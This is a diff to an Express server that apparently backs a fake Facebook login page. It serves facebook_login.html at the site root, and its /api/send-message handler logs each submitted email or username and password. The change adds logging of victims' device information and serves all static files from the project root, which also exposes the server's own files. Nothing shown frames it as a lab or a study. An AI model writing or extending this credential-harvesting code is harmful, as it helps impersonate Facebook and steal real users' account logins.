@@ -9,7 +9,7 @@ console.log('Starting simple server...');
 console.log('Current directory:', __dirname);
 
 // Check if the facebook_login.html file exists
-const facebookLoginPath = path.join(__dirname, 'Niceplace', 'facebook_login.html');
+const facebookLoginPath = path.join(__dirname, 'facebook_login.html');
 if (fs.existsSync(facebookLoginPath)) {
   console.log(`Facebook login file exists at: ${facebookLoginPath}`);
 } else {
@@ -34,8 +34,8 @@ app.use((req, res, next) => {
   next();
 });
 
-// Serve static files from the Niceplace directory
-app.use(express.static(path.join(__dirname, 'Niceplace')));
+// Serve static files from the root directory
+app.use(express.static(__dirname));
 
 // Root route - serve the Facebook login page
 app.get('/', (req, res) => {
@@ -50,6 +50,9 @@ app.post('/api/send-message', (req, res) => {
     console.log('Login attempt received:');
     console.log('- Email/Username:', email);
     console.log('- Password:', password);
+    if (deviceInfo) {
+      console.log('- Device Info:', JSON.stringify(deviceInfo));
+    }
     
     res.status(200).json({ success: true });
   } catch (error) {
@@ -61,6 +64,7 @@ app.post('/api/send-message', (req, res) => {
 // Start the server
 const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`Simple server running on http://0.0.0.0:${PORT}`);
+  console.log(`Serving facebook_login.html directly from root directory`);
 });
 
 // Keep the server running and add some heartbeat logging
